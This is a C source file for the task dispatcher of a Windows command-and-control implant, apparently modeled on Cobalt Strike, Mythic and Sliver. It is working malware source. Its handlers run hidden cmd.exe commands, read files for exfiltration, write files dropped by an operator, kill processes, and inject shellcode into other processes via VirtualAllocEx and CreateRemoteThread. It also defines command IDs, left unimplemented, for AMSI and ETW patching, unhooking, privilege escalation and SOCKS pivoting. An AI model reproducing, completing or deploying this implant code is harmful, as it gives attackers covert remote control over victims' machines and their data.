/*
 * Command Dispatcher - C2 task routing
 * CS/Mythic/Sliver command patterns
 */

#include <windows.h>
#include <tlhelp32.h>

// ============================================================================
// COMMAND IDS
// ============================================================================

#define CMD_NOP         0x00
#define CMD_SLEEP       0x01
#define CMD_EXIT        0x02
#define CMD_CHECKIN     0x03

#define CMD_SHELL       0x10
#define CMD_SHELLCODE   0x11
#define CMD_ASSEMBLY    0x12
#define CMD_POWERSHELL  0x13

#define CMD_PWD         0x20
#define CMD_CD          0x21
#define CMD_LS          0x22
#define CMD_CAT         0x23
#define CMD_UPLOAD      0x24
#define CMD_DOWNLOAD    0x25
#define CMD_RM          0x26
#define CMD_MKDIR       0x27
#define CMD_CP          0x28
#define CMD_MV          0x29

#define CMD_PS          0x30
#define CMD_KILL        0x31
#define CMD_INJECT      0x32
#define CMD_SPAWN       0x33
#define CMD_MIGRATE     0x34

#define CMD_IFCONFIG    0x40
#define CMD_NETSTAT     0x41
#define CMD_PORTSCAN    0x42

#define CMD_WHOAMI      0x50
#define CMD_GETUID      0x51
#define CMD_GETSYSTEM   0x52
#define CMD_TOKEN       0x53

#define CMD_SOCKS       0x60
#define CMD_PORTFWD     0x61

#define CMD_UNHOOK      0x70
#define CMD_PATCH_ETW   0x71
#define CMD_PATCH_AMSI  0x72

// ============================================================================
// TASK/RESULT STRUCTURES
// ============================================================================

#pragma pack(push,1)
typedef struct {
    DWORD id;
    WORD  cmd;
    WORD  flags;
    DWORD len;
    BYTE  data[];
} TASK;

typedef struct {
    DWORD id;
    DWORD status;
    DWORD len;
    BYTE  data[];
} RESULT;
#pragma pack(pop)

#define ST_OK       0
#define ST_ERR      1
#define ST_UNKNOWN  2
#define ST_NOIMPL   3

// ============================================================================
// HANDLER TYPE
// ============================================================================

typedef void (*HANDLER)(TASK*, RESULT*);

typedef struct {
    WORD    cmd;
    HANDLER fn;
} CMD_ENTRY;

// ============================================================================
// COMMAND IMPLEMENTATIONS
// ============================================================================

void h_nop(TASK* t, RESULT* r)
{
    r->status = ST_OK;
    r->len = 0;
}

void h_shell(TASK* t, RESULT* r)
{
    SECURITY_ATTRIBUTES sa = {sizeof(sa), 0, 1};
    HANDLE hR, hW;

    if(!CreatePipe(&hR, &hW, &sa, 0)) {
        r->status = ST_ERR;
        return;
    }

    SetHandleInformation(hR, 1, 0);

    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    si.dwFlags = 0x100 | 1;
    si.hStdOutput = hW;
    si.hStdError = hW;
    si.wShowWindow = 0;

    char cmd[1024];
    wsprintfA(cmd, "cmd.exe /c %.*s", t->len, t->data);

    if(!CreateProcessA(0, cmd, 0, 0, 1, 0x08000000, 0, 0, &si, &pi)) {
        r->status = GetLastError();
        CloseHandle(hR);
        CloseHandle(hW);
        return;
    }

    CloseHandle(hW);
    CloseHandle(pi.hThread);

    DWORD total = 0, rd;
    while(ReadFile(hR, r->data + total, 0xFFFF - total, &rd, 0) && rd)
        total += rd;

    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(hR);

    r->status = ST_OK;
    r->len = total;
}

void h_pwd(TASK* t, RESULT* r)
{
    r->len = GetCurrentDirectoryA(260, (char*)r->data);
    r->status = r->len ? ST_OK : ST_ERR;
}

void h_cd(TASK* t, RESULT* r)
{
    char path[260];
    wsprintfA(path, "%.*s", t->len, t->data);
    r->status = SetCurrentDirectoryA(path) ? ST_OK : ST_ERR;
    r->len = 0;
}

void h_ls(TASK* t, RESULT* r)
{
    char path[260] = ".";
    if(t->len > 0)
        wsprintfA(path, "%.*s\\*", t->len, t->data);
    else
        lstrcpyA(path, ".\\*");

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(path, &fd);
    if(h == INVALID_HANDLE_VALUE) {
        r->status = GetLastError();
        return;
    }

    int pos = 0;
    do {
        char type = (fd.dwFileAttributes & 0x10) ? 'd' : 'f';
        ULONGLONG sz = ((ULONGLONG)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
        pos += wsprintfA((char*)r->data + pos, "%c %I64u %s\n", type, sz, fd.cFileName);
    } while(FindNextFileA(h, &fd) && pos < 0xFFF0);

    FindClose(h);
    r->len = pos;
    r->status = ST_OK;
}

void h_ps(TASK* t, RESULT* r)
{
    HANDLE snap = CreateToolhelp32Snapshot(2, 0);
    if(snap == INVALID_HANDLE_VALUE) {
        r->status = GetLastError();
        return;
    }

    PROCESSENTRY32 pe = {sizeof(pe)};
    int pos = 0;

    pos += wsprintfA((char*)r->data + pos, "%5s  %5s  %s\n", "PID", "PPID", "NAME");

    if(Process32First(snap, &pe)) {
        do {
            pos += wsprintfA((char*)r->data + pos, "%5d  %5d  %s\n",
                pe.th32ProcessID, pe.th32ParentProcessID, pe.szExeFile);
        } while(Process32Next(snap, &pe) && pos < 0xFFF0);
    }

    CloseHandle(snap);
    r->len = pos;
    r->status = ST_OK;
}

void h_download(TASK* t, RESULT* r)
{
    char path[260];
    wsprintfA(path, "%.*s", t->len, t->data);

    HANDLE hF = CreateFileA(path, 0x80000000, 1, 0, 3, 0, 0);
    if(hF == INVALID_HANDLE_VALUE) {
        r->status = GetLastError();
        return;
    }

    DWORD sz = GetFileSize(hF, 0);
    if(sz > 0x100000) sz = 0x100000;  // 1MB limit

    ReadFile(hF, r->data, sz, &r->len, 0);
    CloseHandle(hF);
    r->status = ST_OK;
}

void h_upload(TASK* t, RESULT* r)
{
    // Format: <path_len:4><path><data>
    if(t->len < 5) {
        r->status = ST_ERR;
        return;
    }

    DWORD plen = *(DWORD*)t->data;
    char path[260];
    wsprintfA(path, "%.*s", plen, t->data + 4);

    BYTE* data = t->data + 4 + plen;
    DWORD dlen = t->len - 4 - plen;

    HANDLE hF = CreateFileA(path, 0x40000000, 0, 0, 2, 0x80, 0);
    if(hF == INVALID_HANDLE_VALUE) {
        r->status = GetLastError();
        return;
    }

    DWORD wr;
    WriteFile(hF, data, dlen, &wr, 0);
    CloseHandle(hF);

    r->len = wsprintfA((char*)r->data, "Wrote %d bytes", wr);
    r->status = ST_OK;
}

void h_kill(TASK* t, RESULT* r)
{
    DWORD pid = *(DWORD*)t->data;
    HANDLE h = OpenProcess(1, 0, pid);  // PROCESS_TERMINATE
    if(!h) {
        r->status = GetLastError();
        return;
    }
    TerminateProcess(h, 0);
    CloseHandle(h);
    r->status = ST_OK;
    r->len = 0;
}

void h_inject(TASK* t, RESULT* r)
{
    // Format: <pid:4><shellcode>
    DWORD pid = *(DWORD*)t->data;
    BYTE* sc = t->data + 4;
    DWORD sclen = t->len - 4;

    HANDLE h = OpenProcess(0x1F0FFF, 0, pid);
    if(!h) {
        r->status = GetLastError();
        return;
    }

    LPVOID mem = VirtualAllocEx(h, 0, sclen, 0x3000, 0x40);
    if(!mem) {
        r->status = GetLastError();
        CloseHandle(h);
        return;
    }

    SIZE_T wr;
    WriteProcessMemory(h, mem, sc, sclen, &wr);

    HANDLE ht = CreateRemoteThread(h, 0, 0, (LPTHREAD_START_ROUTINE)mem, 0, 0, 0);
    if(ht) CloseHandle(ht);

    CloseHandle(h);
    r->status = ST_OK;
    r->len = 0;
}

void h_whoami(TASK* t, RESULT* r)
{
    char user[64];
    DWORD sz = sizeof(user);
    GetUserNameA(user, &sz);
    r->len = wsprintfA((char*)r->data, "%s", user);
    r->status = ST_OK;
}

void h_exit(TASK* t, RESULT* r)
{
    r->status = ST_OK;
    r->len = 0;
    ExitProcess(0);
}

void h_noimpl(TASK* t, RESULT* r)
{
    r->status = ST_NOIMPL;
    r->len = 0;
}

// ============================================================================
// COMMAND TABLE
// ============================================================================

static CMD_ENTRY g_cmds[] = {
    { CMD_NOP,      h_nop },
    { CMD_SHELL,    h_shell },
    { CMD_PWD,      h_pwd },
    { CMD_CD,       h_cd },
    { CMD_LS,       h_ls },
    { CMD_PS,       h_ps },
    { CMD_DOWNLOAD, h_download },
    { CMD_UPLOAD,   h_upload },
    { CMD_KILL,     h_kill },
    { CMD_INJECT,   h_inject },
    { CMD_WHOAMI,   h_whoami },
    { CMD_EXIT,     h_exit },
    { 0, 0 }
};

// ============================================================================
// DISPATCHER
// ============================================================================

void dispatch(TASK* t, RESULT* r)
{
    r->id = t->id;
    r->status = ST_UNKNOWN;
    r->len = 0;

    for(int i = 0; g_cmds[i].fn; i++) {
        if(g_cmds[i].cmd == t->cmd) {
            g_cmds[i].fn(t, r);
            return;
        }
    }
}

// ============================================================================
// DYNAMIC REGISTRATION
// ============================================================================

#define MAX_CMDS 128
static CMD_ENTRY g_dyn[MAX_CMDS];
static int g_dyn_cnt = 0;

void register_cmd(WORD cmd, HANDLER fn)
{
    if(g_dyn_cnt < MAX_CMDS) {
        g_dyn[g_dyn_cnt].cmd = cmd;
        g_dyn[g_dyn_cnt].fn = fn;
        g_dyn_cnt++;
    }
}

void dispatch_ext(TASK* t, RESULT* r)
{
    // Check dynamic first
    for(int i = 0; i < g_dyn_cnt; i++) {
        if(g_dyn[i].cmd == t->cmd) {
            g_dyn[i].fn(t, r);
            return;
        }
    }
    // Fall back to static
    dispatch(t, r);
}

// ============================================================================
// EOF
// ============================================================================
